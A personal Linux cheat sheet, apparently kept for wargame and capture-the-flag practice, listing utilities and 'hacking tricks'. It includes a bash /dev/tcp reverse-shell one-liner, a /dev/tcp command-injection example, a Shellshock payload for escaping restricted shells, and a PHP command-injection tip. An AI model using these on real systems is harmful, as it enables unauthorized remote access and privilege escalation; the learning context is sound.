# Linux cheat sheet 
A quick reference for less commonly used commands and tricks.

## File management
  **`xxd`**
    Create hex dumps

  **`strings`**
    Good for getting readable text out of dumps

  **`uniq`**
    Isolate unique lines in file

  **`diff`**
    Examine file differences. vimdiff better for extensive edits

  **`patch`**
    Apply changes to files

  **`mkfifo`**
    first in first out pipe. 

## Networking
  **`nmap`**
    Port scanning. 

  **`nc` or nmap's `ncat`**
    Swiss army knife for network testing.

  **`telnet`**
    Deprecated, but useful for port testing

  **`openssl`**
    Openssl utility: key management, cert generation, etc.

  **`/dev/tcp`**
    Can redirect things through network connections with `/dev/tcp/"ip"/"port"`. Not
    a real file, but more of a bash construct. Useful injection command. Has udp variant too. 
    ex. `bash -c "id &> /dev/tcp/127.0.0.1/80"`

  **`exec "file-descriptor"<>"file"`**
    Can be used to create a read-write file for network communication in lieu netcat.
    Ex. `exec 134<>/dev/tcp/127.0.0.1/30002; bash <&134 >&134 2>&1 &` will open up
    an interactive shell. Just have a listener on port 30002 of the 127.0.0.1 machine

## Programming

  **`ldconfig`**
    Can see installed libs, etc.

  **`ldd`**
    Useful to find what a program is linked against.

## Hacking tricks

  **shellshock**
    `ssh user@host '() { :;}; echo BAD CODE'` allows an authorized user with an authorized key
    to execute restricted commands. Good for restriced shell escalating.

  **PHP**
    Somebody using passthru(), exec(), or system() can possibly be exploited if they aren't
    using escapeshellarg().

## Sites

https://overthewire.org
https://www.scip.ch/en/?labs.20181206
https://hackthebox.eu
https://root-me.org
https://lolbas-project.github.io/#
https://gtfobins.github.io/#+shell
